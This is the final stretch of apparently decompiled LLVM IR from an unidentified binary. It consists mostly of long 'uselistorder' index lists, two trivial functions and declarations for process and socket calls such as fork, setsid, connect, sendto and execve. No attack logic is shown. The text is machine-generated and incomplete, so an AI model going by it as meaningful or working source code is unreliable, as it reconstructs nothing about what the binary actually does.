179, 181, 411, 444, 598, 597, 596, 599, 311, 600, 167, 168, 601, 98, 602, 312, 603, 166, 604, 313, 605, 314, 606, 315, 607, 165, 608, 2, 612, 611, 610, 609, 22, 23, 472, 613, 412, 473, 614, 155, 615, 616, 955, 621, 620, 619, 618, 617, 272, 273, 276, 275, 274, 1212, 1213, 624, 623, 622, 169, 625, 381, 886, 887, 375, 888, 626, 344, 348, 343, 345, 347, 349, 346, 889, 413, 474, 475, 476, 477, 956, 627, 217, 382, 865, 628, 130, 132, 133, 131, 134, 154, 153, 986, 366, 414, 987, 630, 629, 103, 104, 107, 105, 106, 631, 13, 9, 15, 11, 10, 12, 14, 632, 17, 19, 18, 20, 21, 16, 633, 634, 635, 637, 636, 1252, 415, 640, 639, 638, 353, 352, 641, 191, 192, 190, 193, 99, 100, 101, 102, 642, 215, 216, 214, 213, 643, 644, 317, 316, 416, 1216, 645, 250, 251, 478, 479, 377, 649, 648, 647, 646, 162, 161, 393, 650, 318, 651, 255, 652, 189, 653, 277, 654, 8, 655, 319, 656, 90, 657, 74, 480, 1128, 378, 1129, 1130, 481, 1149, 661, 660, 659, 658, 75, 77, 78, 76, 662, 663, 1174, 1175, 665, 664, 321, 322, 320, 1253, 666, 1163, 1164, 1165, 1166, 3, 1004, 1005, 1006, 1007, 920, 921, 667, 323, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 394, 922, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 227, 225, 226, 228, 229, 1192, 368, 33, 32, 31, 395, 1193, 957, 958, 959, 960, 30, 29, 1072, 1071, 839, 840, 841, 842, 843, 844, 845, 1257, 84, 85, 82, 83, 923, 35, 34, 482, 668, 1100, 1097, 1098, 1099, 369, 396, 231, 232, 230, 234, 233, 1084, 1088, 1089, 1090, 1091, 1092, 669, 93, 91, 94, 92, 95, 96, 417, 1085, 1086, 483, 1087, 671, 670, 252, 253, 254, 673, 672, 236, 675, 674, 221, 220, 868, 677, 676, 87, 86, 429, 924, 485, 925, 926, 418, 419, 927, 928, 486, 929, 931, 932, 933, 487, 935, 420, 936, 934, 484, 937, 488, 938, 430, 939, 940, 930, 681, 680, 679, 678, 60, 64, 62, 65, 70, 61, 68, 66, 67, 69, 63, 941, 682, 324, 329, 325, 327, 328, 326, 683, 223, 222, 942, 943, 944, 684, 71, 72, 431, 383, 946, 384, 947, 421, 948, 949, 951, 370, 952, 489, 953, 385, 950, 422, 692, 691, 690, 689, 688, 687, 686, 685, 36, 39, 40, 38, 37, 490, 397, 693, 41, 42, 43, 945, 445, 529, 694, 330, 491, 866, 867, 695, 332, 331, 333, 1254, 446, 1255, 1256, 696, 335, 334, 115, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 398, 1115, 699, 698, 697, 340, 337, 336, 339, 338, 701, 700, 702, 1062, 1063, 1064, 1065, 1066, 705, 704, 703, 25, 26, 1201, 706, 27, 707, 97, 708, 88, 89, 709, 341, 710, 224, 711, 278, 712, 342, 713, 235, 73, 714, 356, 269, 715, 270, 716, 350, 717, 718, 719, 351, 720, 361, 721, 271, 722, 354, 355, 284, 447, 1152, 1153, 448, 1217, 1218, 364, 1219, 869, 371, 386, 870, 871, 872, 365, 494, 873, 874, 875, 876, 877, 878, 879, 880, 492, 493, 436, 495, 881, 729, 728, 727, 726, 725, 724, 723, 882, 883, 736, 735, 734, 733, 732, 530, 731, 730, 884, 885, 738, 737, 496, 890, 891, 497, 740, 739, 498, 954, 744, 743, 742, 741, 961, 535, 968, 969, 970, 971, 972, 973, 499, 749, 748, 747, 746, 745, 257, 256, 974, 975, 976, 977, 978, 500, 979, 980, 981, 982, 756, 755, 754, 753, 752, 751, 750, 283, 282, 983, 762, 761, 760, 759, 758, 757, 988, 846, 847, 502, 848, 501, 849, 850, 838, 989, 990, 771, 770, 769, 768, 767, 766, 765, 764, 763, 281, 280, 279, 503, 504, 775, 774, 773, 772, 451, 1150, 776, 219, 218, 778, 777, 4, 505, 1151, 425, 1154, 780, 779, 449, 1155, 506, 507, 1157, 1156, 508, 783, 782, 781, 452, 1158, 1159, 509, 510, 511, 1167, 531, 1160, 512, 784, 450, 513, 1161, 514, 1162, 790, 789, 788, 787, 786, 785, 453, 1168, 1169, 454, 791, 792, 1170, 515, 1171, 795, 794, 793, 797, 796, 423, 1176, 1177, 1178, 516, 372, 1179, 1180, 1181, 517, 1182, 801, 800, 799, 798, 532, 1183, 802, 258, 1184, 803, 518, 1194, 806, 805, 804, 1195, 533, 129, 456, 1202, 1203, 455, 1204, 1205, 457, 458, 1206, 1207, 807, 1208, 5, 6, 1211, 1209, 1210, 519, 811, 810, 809, 808, 1214, 1215, 813, 812, 817, 816, 815, 814, 820, 819, 818, 822, 821, 1220, 1221, 520, 1231, 1232, 426, 1233, 825, 824, 823, 437, 7, 829, 828, 827, 826, 400, 1222, 1223, 1224, 399, 1225, 1229, 1230, 521, 831, 830, 522, 1226, 1227, 1228, 833, 832, 28, 1234, 1235, 834, 534, 24, 401, 1236, 1237, 835, 357, 1238, 237, 836, 837, 360, 359, 358 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_1a8b0 = load i32, i32* @r0, align 4
  ret i32 %v5_1a8b0

; uselistorder directives
  uselistorder i32* @r0, { 8, 9, 10, 168, 11, 175, 176, 177, 178, 181, 179, 180, 12, 56, 57, 182, 183, 7, 184, 185, 130, 131, 132, 186, 187, 194, 208, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 161, 162, 163, 164, 14, 16, 206, 17, 133, 18, 134, 135, 136, 19, 272, 273, 274, 46, 264, 275, 276, 52, 53, 54, 55, 20, 21, 22, 23, 157, 158, 49, 277, 278, 82, 159, 31, 169, 170, 171, 172, 173, 174, 58, 59, 60, 61, 62, 252, 253, 280, 34, 24, 267, 25, 266, 66, 50, 67, 26, 268, 279, 160, 27, 241, 242, 243, 244, 245, 246, 247, 248, 13, 257, 33, 137, 138, 139, 15, 200, 201, 202, 203, 204, 205, 28, 195, 196, 197, 198, 68, 207, 69, 140, 141, 142, 3, 29, 143, 144, 4, 6, 0, 1, 145, 146, 5, 147, 148, 149, 30, 150, 151, 152, 2, 153, 199, 63, 64, 65, 282, 283, 209, 210, 211, 212, 213, 214, 215, 216, 154, 155, 188, 189, 190, 191, 192, 193, 41, 32, 70, 281, 35, 47, 48, 36, 254, 37, 270, 38, 271, 40, 39, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 156, 165, 166, 167, 249, 250, 251, 255, 256, 258, 259, 260, 261, 262, 263, 265, 269, 42, 43, 44, 45, 51 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1a8b8 = load i32, i32* @r4, align 4
  %v0_1a8c0 = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_1a8b8)
  ret i32 %v0_1a8c0

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 13, 7, 5, 6, 18, 19, 15, 16, 17, 0, 20, 8, 3, 9, 4, 10, 11, 12, 2, 14 }
  uselistorder i32 0, { 0, 1307, 1308, 1309, 1310, 110, 1311, 163, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 164, 875, 878, 876, 877, 1319, 1320, 1321, 1322, 1323, 1324, 1335, 47, 89, 1336, 1337, 1338, 1339, 1340, 1341, 1350, 1351, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1352, 879, 1037, 1038, 1364, 346, 347, 1355, 1356, 165, 1357, 1358, 1360, 1359, 1361, 1362, 282, 1363, 159, 160, 161, 1365, 1353, 1354, 78, 79, 1366, 1368, 1369, 1367, 1370, 1371, 1372, 1373, 102, 1374, 1375, 103, 1376, 104, 1377, 105, 1378, 168, 921, 166, 922, 923, 924, 167, 925, 90, 91, 926, 169, 927, 348, 31, 349, 928, 929, 283, 170, 350, 351, 930, 171, 1379, 1380, 1381, 1383, 172, 1382, 234, 352, 1384, 353, 48, 49, 50, 51, 126, 127, 173, 174, 1385, 128, 1386, 290, 289, 288, 1, 98, 52, 1260, 1261, 1387, 1388, 1262, 286, 1039, 175, 1389, 1390, 1391, 1392, 1393, 1040, 1041, 32, 1042, 1043, 129, 1044, 1045, 1394, 1395, 1396, 2, 1397, 1398, 1046, 176, 1047, 1048, 1049, 1050, 1051, 1052, 1399, 177, 291, 1400, 1407, 1408, 354, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 53, 1418, 1417, 92, 1441, 1442, 355, 1476, 1462, 1463, 1464, 4, 3, 295, 280, 281, 287, 1465, 1466, 1468, 1469, 130, 229, 1471, 356, 1472, 1473, 5, 1474, 1475, 1477, 357, 296, 1470, 1467, 1478, 1479, 178, 1480, 1481, 6, 1556, 1557, 1558, 1559, 180, 179, 1560, 181, 1263, 1264, 7, 880, 1053, 54, 131, 1054, 1055, 235, 8, 881, 237, 1056, 55, 132, 1057, 1058, 236, 1637, 1638, 1639, 1640, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 1650, 1641, 1642, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 33, 1659, 1660, 1661, 1662, 34, 1663, 1664, 35, 1665, 1666, 36, 1667, 1668, 1669, 1670, 1671, 1672, 1673, 1674, 1675, 1676, 1677, 1678, 1679, 1680, 1683, 1684, 1685, 1686, 1687, 1688, 1689, 1690, 1681, 1682, 1691, 1692, 1693, 1694, 1695, 1696, 1697, 1698, 37, 1699, 1700, 1701, 1702, 38, 1703, 1704, 1705, 1706, 39, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1419, 1420, 1434, 358, 359, 1435, 1436, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 182, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 40, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 133, 101, 1097, 1098, 183, 184, 1099, 1100, 1101, 1102, 185, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 41, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 284, 1119, 56, 186, 1120, 187, 360, 1121, 1122, 1123, 1124, 1125, 1126, 42, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 361, 1134, 1135, 1136, 1137, 188, 1138, 1139, 1140, 43, 1141, 123, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1533, 9, 1534, 1535, 1536, 882, 1537, 1538, 1539, 1540, 1541, 1542, 1150, 1149, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 134, 1421, 1422, 10, 1423, 238, 1166, 239, 1167, 1168, 135, 1169, 1569, 1585, 1586, 1587, 1588, 1287, 1719, 1720, 1721, 1722, 1572, 1723, 1573, 1724, 1725, 189, 1726, 108, 1727, 106, 107, 1728, 1729, 1730, 362, 363, 364, 1734, 365, 1745, 1750, 883, 240, 1751, 366, 1749, 367, 368, 11, 1731, 1732, 369, 190, 1244, 297, 1245, 372, 299, 298, 1246, 1247, 1248, 1249, 371, 1250, 1251, 370, 1252, 1574, 191, 1733, 988, 989, 990, 991, 992, 993, 193, 136, 994, 995, 996, 109, 192, 997, 194, 1253, 1254, 373, 1259, 374, 931, 137, 932, 138, 933, 195, 1325, 1326, 1327, 1328, 12, 1500, 1501, 13, 934, 935, 884, 80, 936, 335, 937, 376, 1735, 377, 300, 1736, 1737, 1739, 1740, 375, 1591, 1593, 1594, 57, 241, 1595, 1592, 1589, 1590, 14, 941, 944, 942, 943, 242, 15, 1598, 1596, 1597, 243, 196, 945, 946, 947, 948, 1599, 1600, 378, 16, 1601, 197, 1602, 1603, 1604, 1605, 1606, 1607, 17, 18, 1255, 1256, 1257, 1258, 379, 19, 380, 1482, 1483, 872, 1288, 873, 1608, 1544, 1520, 981, 1521, 1484, 1485, 198, 1486, 1490, 1491, 1492, 1493, 381, 1494, 1495, 1561, 199, 200, 1543, 382, 301, 1746, 201, 20, 202, 203, 1170, 1171, 205, 1172, 383, 204, 1173, 93, 21, 1549, 1550, 1174, 1175, 244, 22, 1176, 1487, 1488, 1489, 23, 1551, 1552, 1553, 24, 1752, 1753, 94, 206, 1177, 1178, 1179, 1180, 1181, 207, 1437, 885, 1438, 124, 139, 1424, 1425, 1432, 1429, 1430, 1431, 245, 1433, 336, 1427, 1426, 246, 1428, 949, 950, 1439, 1440, 951, 952, 1182, 1183, 1184, 1185, 1186, 140, 1187, 1188, 1189, 1190, 1191, 208, 1192, 1194, 1195, 1193, 1196, 141, 1197, 1198, 209, 1199, 210, 285, 384, 1200, 1201, 211, 212, 1202, 1203, 1204, 1205, 1206, 1207, 302, 1208, 1209, 385, 1210, 303, 1212, 217, 1214, 214, 215, 1211, 213, 1213, 1215, 1217, 143, 1218, 1219, 218, 81, 82, 1220, 1221, 142, 386, 1222, 1223, 219, 387, 1224, 1225, 216, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 388, 1237, 111, 86, 1236, 1238, 1239, 1240, 25, 917, 220, 918, 122, 83, 99, 1216, 247, 938, 26, 249, 221, 940, 939, 248, 304, 1748, 1443, 1444, 1445, 84, 1446, 1447, 222, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 162, 1241, 1461, 1401, 1402, 1403, 1404, 1405, 1406, 886, 1609, 1329, 1738, 953, 1545, 1567, 954, 1575, 1741, 112, 1742, 1635, 1747, 1576, 1636, 955, 1577, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 1518, 1578, 1579, 966, 1743, 1744, 27, 1502, 144, 1503, 1504, 231, 230, 887, 113, 114, 115, 116, 889, 888, 59, 58, 145, 1505, 1506, 1507, 1508, 1510, 1509, 28, 1610, 1611, 233, 232, 890, 117, 118, 119, 120, 892, 891, 61, 60, 46, 85, 1612, 893, 29, 1613, 1614, 121, 1615, 1616, 1617, 1618, 1619, 223, 894, 897, 895, 896, 1620, 898, 292, 394, 967, 395, 250, 396, 968, 393, 44, 45, 397, 969, 970, 398, 406, 407, 514, 515, 62, 305, 389, 390, 391, 306, 392, 971, 251, 146, 400, 401, 399, 972, 973, 974, 975, 977, 271, 976, 978, 979, 404, 405, 402, 403, 980, 224, 307, 252, 983, 408, 982, 410, 411, 409, 412, 413, 984, 985, 337, 986, 414, 987, 415, 63, 100, 147, 148, 149, 428, 998, 308, 309, 416, 310, 999, 1000, 425, 225, 1001, 1004, 426, 1002, 427, 226, 1003, 255, 1005, 429, 1006, 422, 1007, 1010, 423, 1008, 424, 1009, 254, 1011, 1012, 419, 1013, 1016, 420, 1014, 421, 1015, 253, 1017, 418, 430, 1018, 1019, 431, 1020, 1023, 432, 1021, 433, 1022, 256, 1024, 417, 434, 1025, 1026, 435, 1027, 1028, 436, 1029, 1030, 1031, 437, 1032, 1033, 1034, 1035, 1036, 438, 227, 1242, 1243, 257, 1265, 293, 1266, 441, 1267, 64, 311, 1268, 1269, 1270, 1277, 440, 1271, 1272, 1273, 1274, 1275, 1276, 258, 1278, 442, 1279, 338, 1280, 1281, 439, 1282, 1283, 1284, 1285, 1286, 150, 1289, 444, 1290, 274, 65, 272, 273, 1291, 1292, 1293, 125, 339, 1294, 445, 1295, 443, 1296, 1297, 1298, 446, 1299, 277, 275, 66, 276, 1300, 1301, 447, 1302, 1303, 448, 1304, 1305, 1306, 312, 450, 451, 449, 452, 899, 900, 475, 901, 902, 903, 904, 474, 905, 906, 907, 908, 473, 909, 910, 911, 912, 470, 471, 453, 913, 472, 469, 259, 260, 914, 915, 461, 916, 462, 463, 464, 465, 466, 467, 468, 874, 1330, 67, 96, 1331, 313, 1332, 454, 455, 456, 457, 458, 459, 460, 68, 87, 95, 476, 477, 1333, 478, 1334, 314, 315, 316, 1496, 340, 1497, 1498, 1499, 97, 151, 152, 69, 70, 228, 1511, 317, 318, 319, 320, 485, 1512, 1514, 1515, 1516, 480, 1517, 481, 482, 483, 479, 261, 484, 1513, 341, 487, 488, 486, 321, 30, 490, 489, 491, 1519, 322, 323, 324, 325, 1522, 1523, 494, 492, 493, 262, 1524, 1525, 1526, 342, 278, 1530, 1531, 326, 1527, 1528, 495, 496, 497, 1529, 499, 500, 501, 502, 503, 498, 263, 504, 1532, 505, 71, 511, 72, 510, 506, 1546, 509, 265, 512, 507, 1547, 508, 264, 513, 73, 88, 1548, 327, 516, 517, 518, 1555, 519, 1554, 521, 522, 520, 523, 524, 1562, 1563, 343, 1564, 1565, 153, 1566, 74, 344, 1568, 266, 525, 526, 527, 528, 1570, 1571, 294, 1580, 1581, 529, 1582, 530, 1583, 1584, 531, 154, 532, 533, 534, 535, 536, 1631, 155, 75, 279, 267, 330, 331, 1621, 1622, 1623, 268, 328, 329, 332, 1624, 1625, 333, 1626, 1627, 270, 76, 156, 157, 269, 1629, 1630, 345, 158, 77, 537, 1628, 1632, 1633, 334, 1634, 919, 920, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 1754, 1755, 1756, 1757, 1758, 1759, 1760, 1761, 1762, 1763, 1764, 1765, 1766, 1767, 1768 }
  uselistorder i32* @r4, { 81, 607, 356, 5, 357, 358, 4, 359, 360, 361, 11, 362, 10, 363, 364, 365, 366, 369, 372, 373, 374, 375, 376, 367, 368, 370, 371, 12, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 392, 391, 393, 394, 395, 396, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 13, 15, 95, 14, 96, 99, 97, 98, 397, 398, 399, 400, 2, 401, 402, 403, 404, 405, 406, 407, 410, 408, 409, 42, 411, 412, 413, 414, 415, 180, 181, 182, 416, 417, 16, 418, 419, 420, 421, 422, 423, 17, 424, 425, 426, 427, 428, 429, 430, 183, 184, 431, 432, 433, 434, 435, 436, 437, 438, 439, 185, 186, 187, 188, 440, 441, 611, 614, 615, 452, 451, 454, 453, 7, 456, 455, 457, 6, 505, 506, 507, 508, 509, 510, 18, 511, 512, 513, 514, 515, 516, 517, 518, 519, 561, 562, 563, 319, 320, 321, 322, 323, 324, 189, 190, 191, 192, 193, 194, 195, 616, 617, 196, 197, 198, 199, 200, 201, 202, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 458, 459, 460, 461, 462, 475, 476, 19, 477, 478, 203, 204, 205, 206, 20, 207, 208, 209, 210, 21, 211, 212, 213, 22, 214, 215, 216, 217, 218, 219, 8, 220, 0, 221, 222, 23, 463, 464, 465, 466, 467, 223, 1, 570, 571, 584, 585, 329, 634, 635, 636, 637, 638, 639, 572, 573, 640, 574, 575, 641, 24, 642, 643, 644, 645, 659, 660, 661, 662, 45, 670, 43, 654, 655, 656, 657, 658, 646, 647, 648, 330, 331, 332, 298, 299, 300, 301, 302, 303, 304, 305, 649, 650, 162, 163, 306, 307, 308, 309, 310, 311, 318, 100, 101, 102, 103, 104, 105, 106, 107, 108, 341, 342, 343, 344, 345, 535, 536, 110, 346, 347, 348, 109, 111, 537, 538, 539, 653, 586, 587, 588, 25, 122, 123, 124, 26, 125, 27, 126, 127, 589, 28, 29, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 312, 313, 314, 315, 316, 317, 520, 521, 522, 523, 333, 334, 603, 604, 553, 554, 546, 547, 160, 161, 548, 549, 524, 525, 526, 527, 528, 30, 529, 530, 531, 532, 533, 534, 550, 551, 31, 552, 663, 664, 665, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 479, 480, 481, 482, 483, 484, 485, 486, 468, 471, 472, 473, 474, 128, 32, 129, 130, 487, 33, 488, 489, 131, 132, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 258, 257, 259, 260, 261, 262, 263, 264, 265, 34, 266, 267, 268, 274, 275, 276, 277, 3, 278, 279, 280, 281, 282, 283, 284, 35, 285, 36, 286, 287, 288, 289, 77, 78, 79, 269, 271, 270, 272, 273, 469, 470, 112, 46, 113, 114, 115, 116, 117, 118, 119, 120, 44, 121, 666, 667, 668, 669, 490, 491, 492, 493, 494, 495, 496, 37, 497, 38, 498, 499, 500, 501, 502, 503, 504, 290, 291, 292, 293, 442, 443, 444, 445, 446, 447, 448, 39, 40, 449, 450, 605, 606, 349, 350, 651, 652, 9, 133, 134, 555, 556, 568, 569, 135, 136, 576, 577, 609, 610, 578, 579, 612, 613, 137, 138, 139, 41, 140, 141, 142, 143, 540, 541, 580, 581, 582, 583, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 294, 295, 296, 297, 325, 326, 327, 328, 335, 336, 337, 338, 339, 340, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 351, 352, 353, 354, 355, 542, 543, 544, 545, 557, 558, 559, 560, 564, 565, 566, 567, 80, 608 }
}

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
